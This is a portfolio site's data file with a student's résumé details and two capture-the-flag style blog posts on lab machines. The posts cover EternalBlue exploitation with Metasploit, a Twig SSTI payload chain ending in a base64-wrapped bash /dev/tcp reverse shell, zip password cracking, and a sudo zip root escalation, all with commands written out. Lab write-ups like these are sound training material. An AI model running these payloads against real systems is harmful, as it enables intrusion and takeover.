/**
 * Portfolio data — single source of truth for static site content.
 * Blog posts are mock objects; future: load from local Markdown files.
 */

export const personalInfo = {
  name: "Muhammad Mahad",
  title: "Software Engineer & Cybersecurity Enthusiast",
  tagline: "Building cloud-native, AI-powered systems with a security-first mindset.",
  email: "mmahad2-c@my.cityu.edu.hk",
  phone: "(852) 5962 4263",
  location: "Hong Kong",
  github: "https://github.com/muhammadmahad4",
  linkedin: "https://www.linkedin.com/in/muhammad-mahad-16a115246/",
  profileImage: "/assets/images/profile-pic.jpeg",
  cvPath: "/assets/cv/My_CV.pdf",
};

export const about = {
  summary:
    "Computer Science undergraduate at CityU (CGPA 3.93/4.3 | Full Tuition Scholarship) with hands-on experience in cloud-native systems, DevSecOps, and agentic AI security. Currently building production ML pipelines at Siemens Mobility Hong Kong. Placed 28th/150 teams in HKCERT CTF 2025.",
  highlights: [
    "CGPA 3.93/4.3 — Dean's List & Tiger Award (Top 10% of Students)",
    "Software Engineering Intern at Siemens Mobility Hong Kong",
    "Team Lead, Technical Teaching Team — AWS Cloud Student Ambassador",
    "28th of 150 teams — HKCERT Capture the Flag 2025",
  ],
};

export const education = [
  {
    id: "cityu-bsc",
    institution: "City University of Hong Kong",
    degree: "BSc. Computer Science",
    gpa: "CGPA: 3.93/4.3",
    period: "Sep 2023 – May 2027",
    location: "Hong Kong",
    honors: [
      "Full Tuition Scholarship",
      "Belt and Road Scholarship Recipient — Hong Kong Government",
      "Dean's List & Tiger Award (Top 10% of Students)",
    ],
  },
  {
    id: "alpha-alevels",
    institution: "Alpha College",
    degree: "Cambridge A Levels — 3 A*s (Physics, Chemistry, Mathematics)",
    period: "Aug 2021 – May 2023",
    location: "Pakistan",
    honors: ["Full Tuition Scholarship"],
  },
];

export const skills = {
  spokenLanguages: [
    "English (Fluent)",
    "Urdu (Fluent)",
    "Hindi (Verbal Fluency)",
  ],
  languages: [
    "Python",
    "Java",
    "JavaScript / TypeScript",
    "C++",
    "React",
    "Node.js",
    "Spring Boot",
  ],
  infraAndData: [
    "Docker",
    "Kubernetes",
    "AWS",
    "Kafka",
    "PostgreSQL",
    "MongoDB",
    "Redis",
    "GitLab CI/CD",
    "Linux",
  ],
  aiAndSecurity: [
    "OpenAI / DeepSeek APIs",
    "LLMs",
    "Nmap",
    "HAProxy",
    "Fail2ban",
    "JumpServer",
  ],
  softSkills: [
    "Problem solving",
    "Analytical thinking",
    "Leadership",
    "Teamwork",
  ],
  certifications: [
    { name: "NVIDIA — Fundamentals of Deep Learning", date: "Jan 2026", status: "Completed" },
    { name: "HackTheBox — Certified Penetration Testing Specialist", date: "2026", status: "In Progress" },
  ],
};

export const experience = [
  {
    id: "siemens",
    role: "Software Engineering Intern",
    company: "Siemens Mobility Hong Kong",
    period: "Jun 2025 – Present",
    location: "Hong Kong",
    bullets: [
      "Built a containerized, event-driven video analytics platform for intelligent transportation using Python (DeepStream), YOLOv8, and a Spring Boot/Kafka/Redis/PostgreSQL microservice stack, deployed via Docker.",
      "Automated secure remote access using Hyper-V, cross-platform hardening with CIS benchmarks, and JumpServer on Kubernetes, streamlining SSH key management and centralizing firewall controls.",
      "Layered production web security with Fail2ban and HAProxy rate limiting, mitigating DDoS and targeted attacks while preserving logging and scalability.",
      "Optimized multi-stage GitLab CI/CD pipelines for cross-platform (ARM/AMD) parallel builds and secure container deployment.",
      "Built a full-stack image annotator tool with React, Java, and PostgreSQL to facilitate precise ROI drawing on camera streams, significantly improving data labeling efficiency for computer vision and data analytics projects.",
    ],
  },
  {
    id: "aws-ambassador",
    role: "Team Lead, Technical Teaching Team",
    company: "AWS Cloud Student Ambassador, AWS Hong Kong",
    period: "Dec 2025 – Present",
    location: "Hong Kong",
    bullets: [
      "Serve as Technical Team Lead, designing and delivering 3 workshops on cloud fundamentals, AI/ML, and deep learning (incl. AWS Bedrock, QuickSight) to 100+ attendees, distributing 37 certification vouchers while coordinating with AWS professionals and faculty to drive campus-wide cloud awareness.",
    ],
  },
  {
    id: "youth-incubator",
    role: "STEM Business Acceleration Intern",
    company: "Youth Incubator Limited, Hong Kong",
    period: "Jun 2024 – Aug 2024",
    location: "Hong Kong",
    bullets: [
      "Scraped and analyzed 700+ URLs, then built a Python/OpenAI API data pipeline for structured extraction into MongoDB, improving event data collection efficiency by 70%.",
      "Developed a WhatsApp chatbot (WhatsApp API, OpenAI API, Botpress, Node.js/Express) automating inquiries and event registration, cutting manual workload by 20+ hours/week.",
      "Built a secure login system with React and Twilio/Memberstack verification, reducing unauthorized access attempts by 40%.",
    ],
  },
];

export const projects = [
  {
    id: "agentic-ai-cyber",
    title: "Agentic AI for Cyber Security",
    subtitle: "Final Year Project",
    tags: ["OpenClaw", "LLMs", "Docker", "Kubernetes", "React", "Node.js", "Nmap"],
    image: "/assets/images/projects/ai-cyber.svg",
    bullets: [
      "Architecting a secure, hardened OpenClaw agentic AI deployment in Docker/Podman and Kubernetes, integrating PostgreSQL, Redis, and a React.js/Node.js dashboard for autonomous security workflow automation.",
      "Deploying a hardened OpenClaw agentic AI platform (Docker/Podman, Kubernetes) with custom modules for reconnaissance, log analysis, and threat correlation using Nmap and AbuseIPDB API.",
      "Evaluating agent performance via quantitative metrics against traditional tools while assessing AI-native risks (prompt injection, privilege escalation) to produce hardening recommendations.",
    ],
    links: {},
  },
  {
    id: "auto-email",
    title: "Auto-Emailing Website",
    subtitle: null,
    tags: ["DeepSeek API", "Google OAuth", "React", "Node.js", "Express"],
    image: "/assets/images/projects/auto-email.svg",
    bullets: [
      "Built a full-stack email automation tool using Google OAuth and the DeepSeek API for AI-powered content generation, streamlining job application workflows by 90%.",
    ],
    links: {
      github: "https://github.com/muhammadmahad4/Auto-Emailer",
    },
  },
];

export const leadership = [
  {
    title: "28th of 150 teams in Open Category, HKCERT Capture the Flag",
    detail: "HKCERT & DPO",
    date: "Dec 2025",
  },
  {
    title: "Teaching Assistant, CS2204: Fundamentals of Internet Applications Dev.",
    detail: null,
    date: "SemA 2025 & 2026",
  },
  {
    title: "Discipline Resident Tutor",
    detail: "Student Residence Office, CityU",
    date: "2025–Present",
  },
  {
    title: "Executive Member",
    detail: "Robotics and Engineering Lab, Alpha College",
    date: "2022–2023",
  },
  {
    title: "Executive Committee",
    detail: "Epsilon Science Olympiad",
    date: "2023",
  },
  {
    title: "Winner, 3 National Science Olympiad Modules",
    detail: "Cedar & Meritorious College",
    date: "2023",
  },
];

/** Blog posts — replace with Markdown loader later */
export const blogPosts = [
  {
    id: "popping-my-first-box-blue",
    slug: "popping-my-first-box-blue",
    title: 'Popping My First Box: How I Hacked "Blue" (My First Real Pentesting Win)',
    date: "2026-07-07",
    summary:
      "From 'I have an IP address' to 'I have a SYSTEM shell', my first hands-on pentest, exploiting EternalBlue (MS17-010) on the classic HackTheBox 'Blue' machine.",
    tags: ["HackTheBox", "Windows", "EternalBlue", "Metasploit", "SMB"],
    thumbnail: "/assets/images/blog/blue/cover.svg",
    readTime: "11 min read",
    content: `
For the last little while I've been going through TCM Security's pentesting course on YouTube, soaking up the theory, watching the methodology, nodding along like I understood it. But there's a huge difference between *watching* someone enumerate a target and actually sitting in your own terminal with a real (if intentionally vulnerable) machine staring back at you, daring you to figure it out.

So I picked "Blue," a classic beginner box built specifically to teach one of the most famous vulnerabilities in Windows history. This is the story of how I went from "I have an IP address" to "I have a SYSTEM shell," including every dumb detour, environment headache, and small victory along the way.

## Setting the Stage: Building the Lab

Before any hacking happened, I had to actually get my lab working, and this ate up more time than I expected. I started on Hyper-V, but quickly ran into the reality that Hyper-V doesn't play nicely with the OVF/VMDK format the Blue box shipped in. Rather than fight endless disk conversions, I made the call to move everything over to VirtualBox instead, since that's the native format for these boxes and it's what most of the community tooling assumes anyway.

Then came the classic "it's not the hack, it's the environment" moment: I couldn't get copy-paste working between my host machine and Kali. What followed was a genuinely frustrating detour through Guest Additions installs, kernel module conflicts, DKMS builds failing silently, and a UID conflict that took a few rounds of troubleshooting to run down. Small lesson here that's easy to forget: **half of pentesting prep is just fighting your own tooling before you even touch the target.**

![VirtualBox Manager showing the Kali attacker VM and the Blue (Windows 7) target VM both running](/assets/images/blog/blue/kali+blue%20ss.PNG)
*Both VMs powered on and networked in VirtualBox Manager: Kali attacker box and the Blue target, side by side.*

Once networking was sorted and I could actually \`ping\` my target (\`10.0.2.15\`), it was finally time for the real work.

## Step One: Reconnaissance, What Am I Even Looking At?

The golden rule I kept reminding myself of: **you don't attack what you haven't identified.** So before touching anything resembling an exploit, I ran Nmap.

First, a quick pass just to see what ports were open at all:

![Initial nmap scan of 10.0.2.15 showing ports 135, 139, 445, and several high ephemeral ports open](/assets/images/blog/blue/nmapinitial.PNG)
*First pass: a plain \`nmap\` scan just to see what's listening.*

That gave me a port list, but not much context. Next I ran an aggressive scan (\`-sV -A\`) to pull service versions, OS detection, and default NSE scripts, and this is where the picture became very clear:

![nmap -sV -A output showing Windows 7 Ultimate SP1 Build 7601 and smb-security-mode with message signing disabled](/assets/images/blog/blue/nmapsvA.PNG)
*Service/OS detection plus NSE script results: the SMB security mode flags message signing as disabled.*

Three ports jumped out immediately: **135, 139, and 445**, a very recognizable Windows SMB trio. 139 is the old NetBIOS-based SMB transport, 445 is the modern, direct TCP version. Both being open told me this box leans heavily on file/printer sharing services, which immediately narrowed my focus.

The scan identified the target precisely: **Windows 7 Ultimate, Build 7601, Service Pack 1**, and nmap's own script flagged something ominous on its own: \`message_signing: disabled (dangerous, but default)\`.

Windows 7 SP1. SMB. A named "vulnerable, dangerous" security setting. If you've spent any time around infosec content, alarm bells should be going off: this is the exact profile of machine affected by one of the most infamous vulnerabilities of the last decade.

## The "Oh, I Know This One" Moment: EternalBlue

I'd heard the name before, mostly in passing: **EternalBlue**, the NSA-developed exploit leaked by the Shadow Brokers in 2017, later famous for powering the WannaCry ransomware outbreak that took down hospitals, telecoms, and businesses worldwide. It targets a flaw in SMBv1 (tracked as **MS17-010 / CVE-2017-0143**), and given the exact Windows 7 SP1 fingerprint I had, plus a box literally named "Blue," the hint wasn't exactly subtle.

But recognizing the name isn't the same as proving it. So instead of jumping straight to exploitation, I confirmed it first, the way you're supposed to: Kali ships with an NSE script written specifically to check for this vulnerability without touching anything.

![nmap smb-vuln-ms17-010 script output confirming the target is vulnerable](/assets/images/blog/blue/nmapscriptvulnerable.PNG)
*Running the dedicated \`smb-vuln-ms17-010\` NSE script to confirm the vulnerability before touching Metasploit.*

There it was, in black and white:

> VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
> Risk factor: HIGH

Confirmed. Time to actually do something about it.

## Exploitation: Metasploit and the Moment Everything Clicked

I fired up \`msfconsole\` and searched for \`eternalblue\`, which returned a handful of related modules, some scanners, some auxiliary tools, and the one I actually wanted: \`exploit/windows/smb/ms17_010_eternalblue\`.

![msfconsole search results for eternalblue listing several matching modules](/assets/images/blog/blue/msfsearcheternalblue.PNG)
*\`search eternalblue\` inside msfconsole: the direct exploit module is index 0.*

I picked that one deliberately over the alternatives. The scanner module was redundant (I'd already confirmed vulnerability via nmap). The \`psexec\` variant needed valid credentials I didn't have. The DOUBLEPULSAR RCE module assumed a backdoor implant that wasn't there yet. This was the actual, direct path in.

I loaded the module, reviewed its options, set my target IP (\`RHOSTS\`), double-checked that \`LHOST\` actually matched my Kali box's real IP (a classic gotcha: if that's wrong, the exploit can succeed on the target side and you'll never see the callback), and fired it.

![Metasploit module options for ms17_010_eternalblue with RHOSTS and LHOST configured](/assets/images/blog/blue/msfoptions.PNG)
*Reviewing \`options\` before firing: RHOSTS set to the target, LHOST/LPORT set for the reverse Meterpreter callback.*

And then:

![Metasploit exploit output ending in "Meterpreter session 1 opened"](/assets/images/blog/blue/meterpreterconnected.PNG)
*The exploit lands: SMB reports the target vulnerable, and a Meterpreter session opens.*

**Meterpreter session opened.** My first shell on my first box, and I just sat there for a second processing that it actually worked.

## The Part Nobody's Tutorial Really Prepares You For: Instability

Here's something I didn't fully appreciate until I lived through it: EternalBlue isn't a clean, polite exploit. It works by corrupting kernel memory to smuggle in a payload (you can see this in the exploit output itself, in language like "pool grooming," "corrupted buffer," "trying exploit with 12 groom allocations"). That means sessions can be genuinely unstable, and re-running the exploit repeatedly risks crashing \`lsass.exe\`, which can crash or reboot the entire target.

I found this out the hard way: right after the session opened, the console immediately logged a communication error on the same connection. Lesson learned in real time: **exploits aren't free to fire repeatedly, especially memory-corruption ones.** In a real engagement, that kind of mistake could take down a production system.

## Stabilizing the Foothold: Landing in Session

Once I had a session, I didn't waste time exploring. I went straight to checking where I'd actually landed. Meterpreter's \`ps\` command let me list every running process on the target along with which user account it ran under:

![Meterpreter ps process list and a migrate 440 attempt showing the session already running at that PID](/assets/images/blog/blue/meterpretershowingpsandmigrat.PNG)
*\`ps\` shows the full process list; attempting \`migrate 440\` reveals the session was already living inside that process.*

I was looking for something specific: a process running as \`NT AUTHORITY\\SYSTEM\`, in the background service session (not tied to an active user desktop), and, critically, something that's essentially always alive on any Windows machine. I went to migrate into \`services.exe\` (PID 440) for exactly that reason: it's the Service Control Manager, the process responsible for starting and stopping every other Windows service, and if it dies, Windows has bigger problems than my shell.

The \`migrate\` command came back with \`[-] Process already running at PID 440\`. Turns out EternalBlue had already dropped my payload straight into \`services.exe\`. No extra hop needed; I was already sitting in the most stable process on the box, running as SYSTEM.

## What I Actually Had

At this point I confirmed my access level and explored the filesystem: the root of \`C:\`, then \`Users\`, then \`Users\\Administrator\`, wandering through directories the way you'd expect a curious attacker to.

![Meterpreter directory listings of C:\\, C:\\Users, and C:\\Users\\Administrator](/assets/images/blog/blue/meterpreterdirectoriesdisplay.PNG)
*Browsing the filesystem from the Meterpreter shell: \`C:\`, then down into \`Users\\Administrator\`.*

Turns out, for this particular exercise, there wasn't a flag file waiting to be found. The objective here was simply proving remote code execution and landing a stable, privileged shell. And honestly, that's a fair objective on its own. **Getting from "here's an IP address" to "I have a SYSTEM-level Meterpreter session on a real Windows box" is the entire core loop of offensive security**, flag or no flag.

## Lessons I'm Taking Away From This

- **Recon isn't optional busywork, it's where the whole plan comes from.** Every decision after the initial nmap scan was downstream of what those first few scans told me.
- **Confirm before you exploit.** The NSE vulnerability check cost me seconds and saved me from blindly firing an exploit at a target that might not have even been vulnerable.
- **Real exploits are messy.** Nothing about EternalBlue was "point, click, done." The session logged errors immediately, and I had to actually think about *why* something failed instead of just retrying blindly.
- **Environment setup is its own skill.** I probably spent as much time fighting VirtualBox/Guest Additions as I did actually hacking the box, and that's apparently just... part of the job sometimes.
- **Know your process landscape.** Understanding *why* \`services.exe\` is a good migration target, and recognizing when you're already there, mattered as much as knowing the exploit itself.

## What's Next

Blue was the perfect on-ramp: a real, historically significant vulnerability, in a controlled environment, with enough friction to actually teach me something without being demoralizing. Next up, I'm looking for a box that'll force me into actual privilege escalation from a low-privilege shell, since EternalBlue was kind enough to hand me SYSTEM directly this time.

![Meterpreter sysinfo and getuid output confirming NT AUTHORITY\\SYSTEM access on the Windows 7 target](/assets/images/blog/blue/ididitshowingmeterpretersysinfoandgetuid.PNG)
*\`sysinfo\` and \`getuid\` confirming it: full SYSTEM access on a real Windows 7 box.*

If you're where I was a few weeks ago, watching tutorials and wondering if you'll ever actually *do* it yourself, just pick a box and start. You'll break your environment, you'll misconfigure something, you'll re-run an exploit you shouldn't have. And then, eventually, you'll see "Meterpreter session opened" and it'll click.
    `.trim(),
  },
  {
    id: "rooting-dev-peh-capstone",
    slug: "rooting-dev-peh-capstone",
    title: "Rooting Dev: TCM Security PEH Capstone (Box 3 of 5)",
    date: "2026-07-11",
    summary:
      "Five open ports, five dead ends, and one very stubborn Twig SSTI chain, from an NFS-leaked SSH key to a GTFOBins zip privesc on the TCM Security PEH capstone box 'Dev.'",
    tags: ["PEH Capstone", "SSTI", "Bolt CMS", "Privilege Escalation", "NFS"],
    thumbnail: "/assets/images/blog/DEV/cover.svg",
    readTime: "16 min read",
    content: `
After Blue and Academy, I figured I had a rhythm down: recon, enumerate, find a foothold, escalate. Dev had other plans. This box is famous in the PEH community for punishing tunnel vision, and it lived up to the reputation, and I opened close to five separate leads before any of them actually paid off, and the one that did wasn't even the one I expected.

This is the full story, including the dead ends, because I think the dead ends are actually the more useful part to write down.

## Recon: Resisting the Urge to Pick a Lane Too Early

First move, standard: full TCP port sweep before anything targeted, so I wouldn't miss something sitting on a weird port.

![Full TCP port sweep of 10.0.2.5 showing five open ports](/assets/images/blog/DEV/initial%20nmap%20-p-%20output.PNG)
*A full port sweep first, so nothing on an odd port gets missed.*

Five open ports came back:

- **22**: SSH
- **80**: Apache/PHP, serving a **Bolt CMS "installation error"** page
- **111**: rpcbind
- **2049**: NFS
- **8080**: Apache/PHP, a live **phpinfo()** page, and nmap flagged it as a **potentially open proxy**

![nmap -A -sV output showing all five services and rpcinfo detail](/assets/images/blog/DEV/nmap%20-A%20-sV%20output%20showing%20all%20five%20services%20and%20rpcinfo%20detail.PNG)
*Service versions, OS guesses, and rpcinfo detail across all five open ports.*

That's genuinely a lot of surface area for one box. I made myself write down all five as "open leads" before touching any of them, specifically because I'd read that Dev punishes people who latch onto the first shiny thing:

1. Bolt CMS misconfiguration on port 80
2. phpinfo() leakage + possible SSRF via the open proxy flag on 8080
3. NFS exports on 111/2049
4. SSH on 22 (no creds yet, parked)
5. Whatever the Bolt error page was actually telling me about folder structure

I didn't know it yet, but three of these five would end up mattering, just not in the order or the way I expected.

## Lead #1: NFS, The One That Actually Cracked Open First

\`showmount -e 10.0.2.5\` (after learning the hard way that \`--all\` shows active mounts, not available exports) revealed a share:

\`\`\`
Export list for 10.0.2.5:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
\`\`\`

![showmount -e output listing the /srv/nfs export](/assets/images/blog/DEV/showmount%20-e%20output.PNG)
*Listing exports rather than active mounts, the flag that matters here is -e, not --all.*

My Kali IP fell inside \`10.0.0.0/8\`, so I mounted it. Inside: a single \`save.zip\`, owned by root.

![Mounted NFS share showing save.zip owned by root](/assets/images/blog/DEV/mounted%20NFS%20share,%20ls%20-la%20showing%20save.zip.webp)
*Inside the mounted share: a single root-owned save.zip.*

Unzipping prompted for a password, so the file was encrypted, not just sitting there in the open. I ran \`zip2john\` to extract a crackable hash, then John with rockyou:

\`\`\`bash
zip2john save.zip > save.hash
john --wordlist=/usr/share/wordlists/rockyou.txt save.hash
\`\`\`

![zip2john extracting a hash from save.zip, cracked by John the Ripper using rockyou](/assets/images/blog/DEV/ZIP2JOHN%20AND%20JOHN%20OUTPUT.webp)
*Cracked almost instantly with rockyou, password: java101.*

Cracked almost instantly: \`java101\`. Weak, dictionary-guessable password, which in hindsight was a theme for this whole box (foreshadowing).

Inside the zip: an \`id_rsa\` private key and a \`todo.txt\`. The todo file turned out to be the single most useful artifact on the entire box:

\`\`\`
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome
jp
\`\`\`

![Contents of the recovered id_rsa private key and todo.txt](/assets/images/blog/DEV/cat%20id_rsa%20and%20cat%20todo.txt.png)
*The todo.txt turned out to be the single most useful file on the box.*

Signed "jp." Reasonable assumption at the time: that's the username. (Foreshadowing again, it wasn't.)

### Dead End #1: SSH with the key, guessing the username

\`\`\`bash
chmod 600 id_rsa
ssh -i id_rsa jp@10.0.2.5
\`\`\`

The key was offered, rejected, and SSH fell through to a password prompt. Verbose mode (\`-v\`) confirmed the key negotiation happened correctly but the server wasn't accepting it for that account, meaning either the username was wrong, or the key just wasn't authorized for that user.

I parked this. Good thing I did, because Bolt was about to become the priority.

## Lead #2: The Broken Bolt Install

The port 80 error page told me plainly: the document root was misconfigured, pointing at \`/var/www/html\` instead of \`/var/www/html/public\`, where the real app lived.

![Bolt CMS "Installation error" page on port 80](/assets/images/blog/DEV/Bolt%20Installation%20error%20page.PNG)
*The document root points at the wrong folder, and pretty-URL routing is silently broken.*

Visiting \`/public/bolt/userfirst\` directly gave a 404. My first instinct was that the route just didn't exist, but the real reason was more subtle: Bolt (a Symfony-based CMS) routes everything through a single front-controller file (\`index.php\`) using \`.htaccess\` rewrite rules, and those rewrite rules depend on the *correct* document root to function. Since the root was misconfigured, pretty-URL rewriting was silently broken.

The fix: bypass rewriting entirely using PHP's \`PATH_INFO\` mechanism, which lets you invoke a real file directly and pass routing information as "extra path" after it:

\`\`\`
http://10.0.2.5/public/index.php/bolt/userfirst
\`\`\`

![Bolt "create the first user" page loading successfully via PATH_INFO](/assets/images/blog/DEV/Bolt%20create%20the%20first%20user%20page%20loading%20successfully.webp)
*Bypassing broken rewrite rules with PATH_INFO lands on an empty user database.*

This worked, and landed on something huge: **an empty user database**, with an explicit note that the first account created would be granted **root/admin privileges** in the app. I created an account and logged in.

![Bolt admin dashboard after logging in as the first created user](/assets/images/blog/DEV/Bolt%20admin%20dashboard%20after%20login.PNG)
*First account created gets admin, logged straight into the dashboard.*

## Lead #3: phpinfo() (Parked, But Not Forgotten)

Before diving fully into Bolt, I'd also pulled the phpinfo() page on port 8080. Key details worth remembering for later:

- PHP 7.3.27, Apache running as \`www-data\`
- \`disable_functions\` blocked only \`pcntl_*\` functions, **not** \`system\`, \`exec\`, \`shell_exec\`, or \`passthru\`. That gap mattered a lot once I needed command execution.
- \`allow_url_fopen: On\`, plus curl supporting unusual protocols, hinting at possible SSRF via the "open proxy" flag nmap raised earlier, though this ended up being a road not taken; Bolt's admin access gave a more direct path.

![phpinfo() page showing the disable_functions configuration](/assets/images/blog/DEV/phpinfo%20page,%20disable_functions%20section.PNG)
*disable_functions blocks pcntl_* only, system, exec, and shell_exec are all still live.*

## Dead End #2: Chasing the Wrong CVE

Inside Bolt's admin panel, File Management exposed direct editing of \`.twig\` template files, clearly dangerous, since Twig evaluates its \`{{ }}\` syntax server-side. Before diving into manual SSTI, I searched for a known CVE against this exact software and found **CVE-2023-46245**.

Turned out to be a red herring: that CVE is for an entirely different application (**Kimai**, a time-tracking tool), not Bolt. Lesson: a CVE number found via casual search isn't automatically the right one, verify against the actual advisory.

The *real* Bolt vulnerability chain (displayname field injection → session file rename → \`.php\` webshell trigger) turned out to be tracked as **CVE-2025-34086**, and its Metasploit module (\`bolt_authenticated_rce\`) explicitly targets **Bolt 3.7.0 and earlier**. My target was running **3.7.2**, patched against this exact chain, per Bolt's own 3.7.1 release notes. Tried it anyway via \`msfconsole search bolt\` just to confirm; as expected, no dice.

![msfconsole search results for bolt](/assets/images/blog/DEV/msfconsole%20search%20bolt%20results.PNG)
*Confirming by hand, the known Bolt RCE module targets 3.7.0 and earlier; this target is 3.7.2.*

Second lesson, layered on the first: matching a CVE to your target's *exact* version matters as much as finding the CVE in the first place. Two dead-end modules confirmed this before I moved on.

## Building the Twig SSTI Payload From Scratch

With the CVE angle closed off, I went back to the more direct route: I already had admin write-access to \`.twig\` templates. That doesn't depend on any patched vulnerability, it's a live feature.

**Step 1: confirm Twig actually evaluates injected expressions:**

\`\`\`
{{ 7*7 }}
\`\`\`

Rendered as \`49\` instead of literal text. Confirmed: whatever I write in this file gets executed as real Twig code, server-side, as \`www-data\`.

![index.twig edited with a {{7*7}} test, rendering 49 on the live page](/assets/images/blog/DEV/index.twig%20showing%2077%20test,%20and%20the%20rendered%2049%20on%20the%20live%20page.PNG)
*49, not literal text, confirmation that Twig is evaluating injected expressions server-side.*

**Step 2: first RCE attempt, using the classic technique:**

\`\`\`
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
\`\`\`

This is a well-documented Twig SSTI technique: register \`system\` as the handler for any "undefined filter," then call a fake filter named \`id\`: smuggling the actual command through as if it were a filter name.

Nothing rendered. No error, no output, no crash.

### Dead End #3: Twig Version Mismatch

I tested \`{{ _self }}\` alone to see what it actually was. It rendered as the plain string \`index.twig\`: not an object. That's the tell: **in Twig 2.x/3.x, \`_self\` is just a string holding the template's name, not an object with an \`.env\` property** (that behavior only exists in Twig 1.x). My whole \`_self.env.___\` chain was silently resolving to nothing.

**Step 3: pivot to the Twig 2.x/3.x-compatible technique**, abusing the built-in \`filter()\` function directly on an array:

\`\`\`
{{ ['id']|filter('system') }}
\`\`\`

This crashed the page outright:

\`\`\`
Uncaught Exception: RuntimeError
Notice: Array to string conversion... in "index.twig" at line 13
\`\`\`

![RuntimeError: Array to string conversion crash page](/assets/images/blog/DEV/RuntimeError%20%20Array%20to%20string%20conversion%20crash%20page.PNG)
*filter() doesn't replace array elements, it just selects them, so Twig chokes trying to print the array.*

### Dead End #4: filter() vs map()

Turns out \`filter()\` *selects* array elements based on a callback's truthiness, it doesn't *replace* them with the callback's return value. So \`system('id')\` may well have run, but Twig then tried to print the original array \`['id']\` and PHP choked trying to stringify an array.

The fix: use \`map()\`, which *does* replace each element with the callback's return value, then \`|join\` to flatten it into a printable string:

\`\`\`
{{ ['id']|map('system')|join }}
\`\`\`

![Page rendering actual command output: uid=33(www-data) gid=33(www-data)](/assets/images/blog/DEV/page%20rendering%20actual%20uid=33(www-data)%20gid=33(www-data)%20output.PNG)
*map() instead of filter(), confirmed code execution as www-data.*

**Confirmed code execution.** (The output appeared twice, \`system()\` echoes its output directly as a side effect *and* returns it for \`map\`/\`join\` to print again. Same execution, not two separate runs.)

## From RCE to a Real Shell

With execution confirmed, I needed a reverse shell, but the one-liner (\`bash -i >& /dev/tcp/10.0.2.3/4444 0>&1\`) is full of characters that don't play nicely nested inside Twig's \`'...'\` string syntax. Solution: base64-encode the whole command so it's quote-safe, then decode-and-execute it on the target:

\`\`\`bash
echo -n 'bash -i >& /dev/tcp/10.0.2.3/4444 0>&1' | base64 -w0
\`\`\`

Final payload:

\`\`\`
{{ ['echo <base64 blob> | base64 -d | bash']|map('system')|join }}
\`\`\`

![Final base64-encoded reverse shell payload saved in index.twig](/assets/images/blog/DEV/final%20payload%20saved%20in%20index.twig.PNG)
*Quote-safe reverse shell payload, base64-encoded to survive Twig's string syntax.*

Listener up, page triggered:

![Netcat listener catching the reverse shell connection as www-data](/assets/images/blog/DEV/netcat%20listener%20catching%20the%20connection%20%E2%80%94%20www-data@dev%20shell.PNG)
*Listener catches the callback, a shell as www-data on dev.*

**Shell as \`www-data\`.** First real foothold on the box.

## Correcting a Wrong Assumption With the Foothold Itself

Remember "jp," signed at the bottom of that todo.txt? With actual filesystem access now, I checked \`/home\`:

\`\`\`
www-data@dev:/home$ ls
jeanpaul
\`\`\`

![/home directory listing showing the jeanpaul account](/assets/images/blog/DEV/home%20listing%20showing%20jeanpaul.PNG)
*"jp" turns out to be initials, not a username, jeanpaul was the real account.*

"jp" was initials, not a username. My earlier SSH attempts had the *right key* and the *wrong account* the entire time.

\`www-data\` didn't have permission to read \`jeanpaul\`'s \`.ssh\` or \`.bash_history\` directly (as expected, that's the system working correctly, not a bug), but that didn't matter. I already had the key. I just needed the right username paired with it.

### Dead End #5: Key Permissions, Again

First retry with \`jeanpaul\` fell through to a password prompt, not because of a wrong username this time, but because the key's file permissions had reset to something too open (\`0744\`), and SSH refuses to even attempt a key that isn't locked down:

\`\`\`bash
chmod 600 ./id_rsa
ssh -i ./id_rsa jeanpaul@10.0.2.5
\`\`\`

This time: **"Enter passphrase for key"**, a different lock than before. The key itself was passphrase-protected.

Only one password had surfaced on the entire box so far: \`I_love_java\`, found in Bolt's database config, and clearly connected to the same person who wrote "keep coding in Java because it's awesome" in the todo file. It had already failed once as a login password, but a key passphrase is a different kind of secret to unlock, and password reuse across different purposes (not just different services) is extremely common.

![SSH session successfully authenticating as jeanpaul using the recovered key and reused passphrase](/assets/images/blog/DEV/SSH%20session%20successfully%20authenticating%20as%20jeanpaul%20with%20the%20reused%20passphrase.PNG)
*The recovered id_rsa, unlocked with the same password found earlier, reused as a key passphrase.*

**Real user shell, as \`jeanpaul\`.**

## Privilege Escalation: Sudo, GTFOBins, and Zip

First check, as always:

\`\`\`bash
sudo -l
\`\`\`

\`\`\`
User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
\`\`\`

![sudo -l output showing NOPASSWD access to /usr/bin/zip as root](/assets/images/blog/DEV/sudo%20-l%20output.PNG)
*One binary, no password required, small surface, but enough.*

\`jeanpaul\` could run one very specific binary, \`zip\`, as root, without a password. Not obviously dangerous on its face, but a quick check of GTFOBins confirmed \`zip\` has a documented sudo-escalation technique: its \`-T\`/\`-TT\` "test archive" flags let you specify an arbitrary command to run as the "test," and since \`sudo\` doesn't strip elevated privileges before \`zip\` runs that test internally, the spawned shell inherits root:

\`\`\`bash
sudo zip jeanpaul /etc/hosts -T -TT '/bin/sh #'
\`\`\`

![Root shell spawned via the GTFOBins sudo zip technique](/assets/images/blog/DEV/root%20shell%20spawned%20via%20sudo%20zip%20GTFOBins%20technique.PNG)
*zip's -T/-TT test-archive flags run an arbitrary command as root.*

\`\`\`
# whoami
root
# cd /root
# cat flag.txt
Congratz on rooting this box!
\`\`\`

![Contents of flag.txt confirming root](/assets/images/blog/DEV/flag.txt%20contents.PNG)
*Root, confirmed.*

**Root.**

## Lessons Learned

- **The "punishes tunnel vision" reputation is well-earned.** Five open ports, and at least three of them ended up mattering directly (NFS, Bolt/80, the admin panel reached through 80). Treating every open port as a parked lead rather than picking one and forgetting the rest paid off multiple times.
- **A signature isn't necessarily a username.** "jp" looked like an obvious username guess and cost me time chasing SSH logins that were never going to work. The real answer only surfaced once I had filesystem access to just check /home.
- **Verify CVE version ranges against your actual target before investing time.** I hit two dead ends here: one CVE that turned out to be for entirely different software, and a second that was real but already patched in the version I was facing.
- **Password reuse isn't limited to "the same password on the same service."** I_love_java failed as an SSH login password but succeeded as an SSH key passphrase, a different unlock mechanism, same underlying reused secret.
